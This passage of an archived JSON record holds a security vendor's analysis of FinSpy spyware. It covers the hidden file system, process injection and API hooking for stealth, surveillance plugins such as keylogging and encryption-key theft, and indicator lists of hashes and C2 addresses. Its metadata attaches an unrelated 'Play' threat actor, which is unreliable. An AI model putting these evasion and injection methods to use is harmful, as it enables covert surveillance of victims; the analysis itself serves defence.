includes one or multiple C2 servers which it can connect to. In case one of\nthe servers is down, the backdoor uses one of the fallback addresses. FinSpy does not communicate\nwith C2 servers directly from winlogon.exe or explorer.exe. Instead, it spawns a default browser\nprocess with a hidden window and injects the Communicator module in it. This is done to make\ncommunications look legitimate.\n\n## The Virtual File System component\n\nThe Virtual File System is the place where all the plugin executables and their configurations hide. All\nthe virtual files are stored in a single “real” file, which is encrypted with RC4 and has the following\nstructure:\n\n**File offset** **Description**\n\n**0x0** CRC32 checksum of the file (the checksum\ncomputation starts from offset 4)\n\n**VFS entry #1**\n\n**0x4** ID of the plugin corresponding to the file. The\nOrchestrator configuration is stored on the VFS\nwith ID 0xFFFFFFFE.\n\n**0x8** 0x0 if the file is a plugin configuration, 0x2 if it is a\nplugin executable.\n\n**0xC** File size.\n\n**0x10** File size again.\n\n**0x14** File body bytes.\n\n**VFS entry #2**\n\n**…**\n\n**The last VFS entry has the ID equal to**\n**0xFFFFFFFF and zero size. It serves as the**\n**VFS end marker.**\n\nEndOfFile – 0x10 0xFFFFFFFF\n\nEndOfFile – 0xC 0x0\n\n\n-----\n\nEndOfFile – 0x8 0x0\n\nEndOfFile – 0x4 0x0\n\nThe VFS is accessed via file management functions hooked by the Orchestrator. For example, virtual\nfiles can be created or opened via the hooked CreateFileW API. The return value of the hooked file\ncreation function is a VFS handle, which is a number of the format 0xFF000XXX.\n\n## The ProcessWorm\n\nThe malware injects the ProcessWorm into all processes running on the system. Its main purpose is\nto extract specific information about running processes and send it to the Orchestrator or the plugins.\n\nThe ProcessWorm is a DLL wrapped in a shellcode and obfuscated with FinSpy VM. The\nProcessWorm can be injected to processes in two ways – either by spawning a remote thread with\n[the shellcode or by creating an APC (Asynchronous Procedure Call) with the procedure address](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)\npointing to the start of the shellcode. The latter one is used when the ProcessWorm is injected into\nnewly created processes.\n\nThe loader code behaves differently depending on the chosen injection type. While the loader used\nwith the first injection method is simple, the one invoked in case of APC injections is rather\ninteresting. The asynchronous procedure places a hook on the NtTestAlert function and then exits.\nWhen the process executable is loaded, ntdll.dll will call the NtTestAlert function. Its modified\nversion will first call the original NtTestAlert function and then invoke the ProcessWorm reflective\nloader.\n\nThe ProcessWorm reflective loader comes with a twist. When it processes imports, it does not assign\na function pointer to each entry in the IAT. Instead, IAT entries point to buffers of randomly generated\njunk code. This code obtains the address of the destination API function by XOR-ing two numbers\nand then jumps to it.\n\n\n-----\n\n**_Example of junk code created by the ProcessWorm loader, useful instructions are highlighted_**\n**_in yellow_**\n\nWhile executing its worm-like activity, the ProcessWorm injects itself into processes created by the\nprocess that are already infected with this component. To do that, it places a hook on the\n**CreateProcessInternalW API function. If the new process is not created with a DEBUG_PROCESS**\nor a DEBUG_ONLY_THIS_PROCESS flag, the hooked process creation function clears a possible\nhook of the NtQueueAPCThread function and then uses it to create an APC procedure in the new\nprocess. When the new process starts up, the ProcessWorm will be loaded with the help of the APC\ninjection loader.\n\nDepending on the malware configuration, the ProcessWorm may hide the presence of FinSpy on the\nvictim machine. It can conceal the malware’s working directory, services, registry keys, C2 server\naddresses, as well as filter out event logs related to the malicious activity. The ProcessWorm\nachieves stealth by hooking low-level API functions (such as NtEnumerateValueKey or\n**NtQuerySystemInformation)**\n\nThe rest of the malicious activity is dispersed across hooks of various WinAPI functions. They are\nplaced in order to provide information to the plugins bundled with the malware. Examples of such\ninformation are typed keystrokes or documents sent to the printer.\n\n## The macOS and Linux Orchestrator\n\nThe macOS/Linux orchestrator is a simplified version of the Windows orchestrator. Unlike the\nWindows version, it does have the following components:\n\n\n-----\n\nThe Virtual File System (plugins and configurations are stored in separate files)\nThe ProcessWorm (its functionality is embedded into plugins)\nThe communicator module (the Orchestrator exchanges data with C2 servers without additional\nmodules)\nThe application watcher (the Orchestrator does not report started or stopped processes to C2\nservers)\n\nThe functionalities of the Orchestrator remain the same: exchanging information with the C2 server,\ndispatching commands to plugins and managing recording files.\n\n## Plugins overview\n\nIn the chart below we summarize information about plugins.\n\n**Plugin type and ID** **Features**\n\nFileManager (0x02) Upload, download, search, delete files. Create file listing recordings\n\nCommandShell (0x04) Create remote shell sessions\n\nTaskScheduler (0x05) Create different types of recordings (file listings, microphone, screen,\nwebcam) at a specified time by dispatching commands to appropriate\nplugins\n\nMicRecorder (0x10) Livestream the victim’s microphone or capture its recordings.\n\nKeyLogger (0x12) Livestream or record keystrokes\n\nSkypeStealer (0x14) Intercept Skype contacts, chats, calls and transferred files\n\n\nFileModificationRecorder\n(0x16)\n\nFileAccessRecorder\n(0x17)\n\nPrintedFilesRecorder\n(0x18)\n\nFileDeletionRecorder\n(0x19)\n\nForensicLauncher\n(0x20)\n\nVoIPRecorder, VoIPLite\n(0x21, 0x26)\n\n\nRecord files which have been modified\n\nRecord files which have been accessed\n\nSteal files which are printed by the victim\n\nRecord removed files\n\nGather forensic data by downloading and executing specific utilities.\n(Windows only)\n\nEavesdrop on, and take screenshots during, online conversations.\n(Windows only)\n\n\nClickRecorder (0x22) Capture the screen area around mouse click locations\n\n\nWebcamRecorder\n(0x23)\n\n\nTake webcam images with a specified frame rate, and livestream or\nrecord them.\n\n\n-----\n\nScreenRecorder (0x24) Take screenshots with a specified frame rate, and livestream or record\nthem.\n\nBlackberryInfect (0x25) Infect Blackberry mobile devices with a malicious application. (Windows\nonly)\n\nEmailRecorder (0x27) Steal email from Thunderbird, Outlook, Apple Mail and Icedove\n\nWiFiRecorder (0x28) Monitor available Wi-Fi networks\n\n\nRemovableRecorder\n(0x29)\n\nCryptoKeyRecorder\n(0x30)\n\n\nRecord files on inserted removable media\n\nCapture encryption keys: SSL keys, S/MIME certificates, GPG/PGP\nkeychains along with their passphrases. (Windows only)\n\n\nThe full details of this research, as well as future updates on FinSpy, are available to customers of the\nAPT reporting service through our Threat Intelligence Portal.\n\n## IoCs\n\nThe following IoC list is not complete. If you want more information about the APT discussed here, a\nfull IoC list and YARA rules are available to customers of Kaspersky Threat Intelligence Reports.\nContact: [intelreports@kaspersky.com](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n\n**File Hashes**\n\n[5EDF9810355DE986EAD251B297856F38](https://opentip.kaspersky.com/5EDF9810355DE986EAD251B297856F38/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[31F1D208EE740E1FDF9667B2E525F3D7](https://opentip.kaspersky.com/31F1D208EE740E1FDF9667B2E525F3D7/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[4994952020DA28BB0AA023D236A6BF3B](https://opentip.kaspersky.com/4994952020DA28BB0AA023D236A6BF3B/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[262C9241B5F50293CB972C0E93D5D5FC](https://opentip.kaspersky.com/262C9241B5F50293CB972C0E93D5D5FC/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[405BB24ADE435693B11AF1D81E2BB279](https://opentip.kaspersky.com/405BB24ADE435693B11AF1D81E2BB279/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[EF74C95B1DBDBF9BD231DA1EE99F0A7E](https://opentip.kaspersky.com/EF74C95B1DBDBF9BD231DA1EE99F0A7E/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n[B8A15A0CE29692FBA36A87FCDED971DE](https://opentip.kaspersky.com/B8A15A0CE29692FBA36A87FCDED971DE/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**File Paths**\n\n\\efi\\microsoft\\boot\\en-us\\%HEXNUMS% – on EFI disk partition\n/Library/Frameworks/Storage.framework – for Mac OS version\n\n**Mutexes**\n\nSessionImmersiveMutex\nWininetStartupMutex0\n\n**Events**\n\n0x0A7F1FFAB12BB2\nWinlogonLogon\nDebug.Trace.Event.f120.0.v1\n\n\n-----\n\nTermSrvReadyEvent%HEXNUMS%\nSessionImmersiveEvent\n\n**Filemappings**\n\n0x0A7F1FFAB12BB3\nwindows_shell_global\n\n**Mailslots**\n\nmailslot\\x86_microsoft.windows.c-controls.resources_6595b64144ccf1df_6.0.7600.16385_enus_581cd2bf5825dde9\nmailslot\\x86_microsoft.vc90.mfc_1fc8b3b9a1e18e3b_9.0.30729.6161_none_4bf7e3e2bf9ada4c\nmailslot\\6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\nmailslot\\ConsoleEvent-0x00000DAC–16628266191048322066-650920812-16226831161844332734-1046489716-2050906124-443455187\n\n**Domains and IPs**\n\n45.86.136[.]138\n79.143.87[.]216\n185.25.51[.]104\n109.235.67[.]175\n213.252.247[.]105\n108.61.190[.]183\n185.141.24[.]204\n\n1 [Extended BIOS Data Area (https://wiki.osdev.org/Memory_Map_(x86))](https://wiki.osdev.org/Memory_Map_(x86))\n\n[Apple MacOS](https://securelist.com/tag/apple-macos/)\n[Linux](https://securelist.com/tag/linux/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[MBR](https://securelist.com/tag/mbr/)\n[Spyware](https://securelist.com/tag/spyware/)\n[Trojan](https://securelist.com/tag/trojan/)\n[UEFI](https://securelist.com/tag/uefi/)\n[Virtualization](https://securelist.com/tag/virtualization/)\n\nAuthors\n\nGReAT\n\nFinSpy: unseen findings\n\n\n-----\n\nYour email address will not be published. Required fields are marked\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-28 - FinSpy- unseen findings.pdf"
    ],
    "report_names": [
        "2021-09-28 - FinSpy- unseen findings.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535836,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653703513,
    "ts_modification_date": 1653703513,
    "files": {
        "pdf": "https://archive.orkl.eu/145ecb9579d977b7cc23047f87b16a22f8611061.pdf",
        "text": "https://archive.orkl.eu/145ecb9579d977b7cc23047f87b16a22f8611061.txt",
        "img": "https://archive.orkl.eu/145ecb9579d977b7cc23047f87b16a22f8611061.jpg"
    }
}